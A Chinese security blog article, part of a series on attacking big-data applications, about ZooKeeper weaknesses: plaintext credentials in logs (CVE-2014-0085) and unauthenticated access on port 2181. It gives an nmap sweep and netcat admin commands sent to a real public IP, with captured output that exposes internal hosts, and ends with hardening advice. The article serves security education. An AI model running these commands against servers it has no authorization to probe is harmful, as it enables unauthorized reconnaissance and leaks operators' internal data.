# 攻击大数据应用（二） #

[http://www.mottoin.com/95510.html](http://www.mottoin.com/95510.html)

re4lity@MottoIN

## 0x01 前言 ##

随着大数据时代的到来，越来越多的大数据技术已逐渐被应用于实际生产，但作为一个安全人员，我们关注点必然和安全相关，那大数据环境中面临的安全问题又有哪些呢？Stardustsky牛的[《攻击大数据应用（一）》](http://www.mottoin.com/85603.html)对大数据的一些技术做一个简单的概念介绍并总结了Elasticsearch的四种攻击方式。这里我打算整理成一系列的Paper,本篇我们将着重探索一下ZooKeeper存在的一些安全问题。

## 0x02 ZooKeeper漏洞 ##

ZooKeeper是一个开放源码的分布式应用程序协调服务，提供的功能包括:配置维护、名字服务、分布式同步、组服务等。Zookeeper默认是未授权就可以访问，特别对于公网开放的Zookeeper来说，这也导致了信息泄露的存在。

常见安全隐患：

- 信息泄露
- 开放公网访问
- 未认证访问

### 一、信息泄露 ###

这个漏洞的漏洞编号为CVE-2014-0085，是14年发现的一个信息泄露漏洞，危害级别比较低。我们看看漏洞描述：

![](https://ooo.0o0.ooo/2017/01/12/58772fd442513.png)

该漏洞源于程序记录明文admin密码。本地攻击者可通过读取日志利用该漏洞获取敏感信息。

在zookeeper中zoo.cfg中可以配置dataLogDir来单独放置事务log，可以很好的避免与普通log和内存快照混合。但是Zookeeper中使用了明文来显示密码，这就导致了信息的泄露。

该漏洞的利用场景：

内网渗透中遇到ZooKeeper集群后，可以查找事务日志来获取admin的密码或者其他敏感资源的认证方法。访问logs目录：

![](https://ooo.0o0.ooo/2017/01/12/5877314c7a25c.png)

可以看到认证中客户端使用的账号密码。如果是管理员的密码，就会造成更大的影响。

### 二、开放公网访问&未授权访问 ###

未授权访问是Zookeeper目前存在的最为严重的一个安全问题，相当多的企业将其直接放置于公网，且未作任何访问限制，导致攻击者可直接访问到很多内部信息。

先来张图压压惊：

![20170112162054.png](https://ooo.0o0.ooo/2017/01/12/58773d2c6bcd7.png)

Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令！

我们通过Zoomeye看一下全球对外开放的Zookeeper有多少:

![20170112170801.png](https://ooo.0o0.ooo/2017/01/12/587747ef4772b.png)

![20170112170858.png](https://ooo.0o0.ooo/2017/01/12/587747ef7248b.png)

结果显示全球大约有3W+主机开放了2181端口，也就说全球大约有3W+的Zookeeper未授权访问漏洞！

**利用**

发现 Zookeeper

    nmap -sS -p2181 -oG zookeeper.gnmap 192.168.1.0/24  
    grep "Ports: 2181/open/tcp" zookeeper.gnmap | cut -f 2 -d ' ' > Live.txt



例如某厂商的Zookeeper未授权访问：

远程获取该服务器的环境

    echo envi | nc ip port

![db71d42d5231e4e7486deec4ea4467cbe793172b.jpg](https://ooo.0o0.ooo/2017/01/12/587749087c56c.jpg)

直接连接

    ./zkCli.sh -server ip:port

**命令运行示例：**

`dump`：列出未完成的会话和临时节点。

    $ echo dump |ncat 52.2.164.229 2181
    SessionTracker dump:
    Global Sessions(7):
    0x1053c5850800023   4000ms
    0x1053c5850800024   4000ms
    0x2000b1ecdeb0160   4000ms
    0x2000b1ecdeb0161   4000ms
    0x2000b1ecdeb0162   4000ms
    0x3055d0251540008   4000ms
    0x3055d0251540009   4000ms
    ephemeral nodes dump:
    Sessions with Ephemerals (5):
    0x1053c5850800024:
    /borg/locutus/agents/061e4b6/10.92.1.192:9257
    0x1053c5850800023:
    /borg/locutus/agents/061e4b6/10.92.1.118:9257
    0x3055d0251540008:
    /borg/locutus/agents/061e4b6/10.92.1.120:9257
    0x2000b1ecdeb0162:
    /borg/locutus/agents/061e4b6/10.92.1.87:9257
    0x3055d0251540009:
    /borg/locutus/agents/061e4b6/10.92.1.10:9257
    Connections dump:
    Connections Sets (2)/(7):
    Ncat: An established connection was aborted by the software in your host machine. .

`envi`：打印有关服务环境的详细信息。

    $ echo envi |ncat 52.2.164.229 2181
    Environment:
    zookeeper.version=3.5.1-alpha-1693007, built on 07/28/2015 07:19 GMT
    host.name=locutus-zk3.ec2.shopify.com
    java.version=1.7.0_79
    java.vendor=Oracle Corporation
    java.home=/usr/lib/jvm/java-7-openjdk-amd64/jre
    java.class.path=:/etc/zookeeper-locutus:/usr/src/zookeeper-locutus/zookeeper/zookeeper-3.5.1-alpha.jar:/usr/src/zookeeper-locutus/zookeeper/lib/commons-cli-1.2.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jackson-core-asl-1.9.11.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jackson-mapper-asl-1.9.11.jar:/usr/src/zookeeper-locutus/zookeeper/lib/javacc.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jetty-6.1.26.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jetty-util-6.1.26.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jline-0.9.94.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jline-2.11.jar:/usr/src/zookeeper-locutus/zookeeper/lib/log4j-1.2.16.jar:/usr/src/zookeeper-locutus/zookeeper/lib/netty-3.7.0.Final.jar:/usr/src/zookeeper-locutus/zookeeper/lib/servlet-api-2.5-20081211.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-api-1.6.1.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-api-1.7.5.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-log4j12-1.6.1.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-log4j12-1.7.5.jar
    java.library.path=/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib
    java.Ncat: An established connection was aborted by the software in your host machine.

`reqs`：列出未完成的请求。

    $ echo reqs |ncat 52.2.164.229 2181
    close: Result too large

`ruok`：测试服务器是否运行在非错误状态。

    $ echo ruok |ncat 52.2.164.229 2181
    imok

`stat`：列出关于性能和连接的客户端的统计信息。

    $ echo stat |ncat 52.2.164.229 2181
    Zookeeper version: 3.5.1-alpha-1693007, built on 07/28/2015 07:19 GMT
    Clients:
     /10.92.1.120:35986[1](queued=0,recved=2238053,sent=2238053)
     /10.92.1.10:48851[1](queued=0,recved=2235979,sent=2235979)
     /10.92.1.242:54198[1](queued=0,recved=713623,sent=713623)
     /86.136.100.60:11057[0](queued=0,recved=1,sent=0)
     /10.92.1.253:60423[1](queued=0,recved=2204714,sent=2204714)
     /10.92.1.192:47933[1](queued=0,recved=1926008,sent=1926008)
     /10.92.1.118:37256[1](queued=0,recved=129470,sent=129470)
    
    Latency min/avg/max: 0/0/981
    Received: 25813570
    Sent: 25813622
    Connections: 7
    Outstanding: 0
    Zxid: 0xc2000016ad
    Mode: follower
    Node count: 192

`kill`命令太危险就不测试了。

ZooKeeper的一些基本知识和命令可以参考：[《Zookeeper中文文档》](http://zookeeper.majunwei.com/)

这里贴上一个ZooKeeper未授权访问的检测脚本：

[
https://github.com/ysrc/xunfeng/blob/master/vulscan/vuldb/zookeeper_unauth_access.py](https://github.com/ysrc/xunfeng/blob/master/vulscan/vuldb/zookeeper_unauth_access.py)

## 0x03 加固建议 ##

- 禁止把Zookeeper直接暴露在公网
- 添加访问控制，根据情况选择对应方式（认证用户，用户名密码，指定IP）

## 0x04 总结 ##

本文主要介绍了ZooKeeper的一些安全隐患和攻击方式，但这些漏洞除了非授权访问基本上都已被修复。篇幅有些短，因为大数据安全对很多安全研究者来说还是个比较陌生的领域，网上关于这方面的案例不多，大家对大数据应用的安全重视程度也还比较低，但是对于大数据逐渐泛滥的今天，相信会有更多的从业者投身到该领域的研究中来。欢迎补充:-)

## 0x05 参考 ##

- [http://www.mottoin.com/92742.html](http://www.mottoin.com/92742.html)
- [https://hackerone.com/reports/154369](https://hackerone.com/reports/154369)
- [http://cve.scap.org.cn/CVE-2014-0085.html](http://cve.scap.org.cn/CVE-2014-0085.html)
- [http://ifeve.com/zookeeper_guidetozkoperations/](http://ifeve.com/zookeeper_guidetozkoperations/)
- [http://blog.csdn.net/u011721501/article/details/44062617](http://blog.csdn.net/u011721501/article/details/44062617)